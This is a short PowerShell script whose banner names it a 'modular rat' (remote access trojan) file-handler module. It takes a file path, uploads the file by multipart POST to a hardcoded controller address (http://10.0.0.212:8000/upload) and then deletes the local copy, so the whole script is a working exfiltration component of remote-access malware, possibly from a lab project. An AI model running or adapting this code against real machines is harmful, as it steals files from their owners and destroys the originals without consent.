$file_name = If ($args[0]) { $args[0] }else { Write-Error "Please specify the file name..." }

function title {
   Write-Host "%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%" -ForegroundColor Yellow
   Write-Host "
    _ __ ___   ___   __| |_   _| | __ _ _ __   _ __ __ _| |_
   | '_ ` _ \ / _ \ / _` | | | | |/ _` | '__| | '__/ _` | __|
   | | | | | | (_) | (_| | |_| | | (_| | |    | | | (_| | |_
   |_| |_| |_|\___/ \__,_|\__,_|_|\__,_|_|    |_|  \__,_|\__|
   " -ForegroundColor Yellow
   Write-Host "
                       Module : File Handler
   " -ForegroundColor Blue
   Write-Host "%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%" -ForegroundColor Yellow
   Write-Host ""
}


function upload($file_location) {
   $uri = "http://10.0.0.212:8000/upload"
   $params = @{
      files = $file_location
   }
   $multipartContent = New-Object System.Net.Http.MultipartFormDataContent

   foreach ($param in $params.GetEnumerator()) {
      $stream = [System.IO.File]::OpenRead($param.Value.FullName)
      $fileContent = New-Object System.Net.Http.StreamContent($stream)
      $multipartContent.Add($fileContent, $param.Key)
   }

   $response = Invoke-RestMethod -Uri $uri -Method POST -Body $multipartContent

   Write-Host $response
}

function run() {
   title
   try {
      $location = Get-Item "$file_name" -ErrorAction Stop
      upload($location)
      Remove-Item "$location"
   }
   catch {
      Write-Host "Error while trying to upload file..." -ForegroundColor Red
      exit 
   }
}

run